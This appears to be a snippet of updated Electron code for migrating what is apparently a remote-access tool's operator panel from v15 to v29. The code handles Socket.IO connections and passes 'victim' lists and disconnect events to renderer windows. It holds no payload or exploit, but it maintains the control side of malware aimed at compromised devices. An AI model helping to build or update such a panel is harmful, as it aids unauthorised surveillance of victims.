## Updated `main.js` & `AppCtrl.js`
> For Migration to Electron v15 > v29.
<details>
    <summary>Updated Main Process for Electron Version x.x.x</summary>
    <br>
...
ipcMain.on('SocketIO:Listen', function (event, port) {
    ...
    IOs[port].sockets.on('connection', function (socket) {
        ...
        socket.on('disconnect', function () {
            ...
            // Notify renderer process about the disconnected Victim
            win.webContents.send('SocketIO:RemoveVictim', index);

            if (windows[index]) {
                // Notify renderer process if opened about the disconnected Victim
                BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
                // Delete the window from windowsList
                delete windows[index];
            }

            // Notify renderer process if opened about the Server Disconnecting
            if (windows[index]) {
...
ipcMain.on('getVictimList', (event) => {
    // Send the current victim list to the renderer process
    event.reply('updateVictimList', victimsList.getVictimList());
});

ipcMain.on('getVictim', (event, index) => {
    // Send individual victim information to the renderer process
    event.reply('updateVictim', index, victimsList.getVictim(index));
});
...
var victimsList = require('@electron/remote').require('./main');
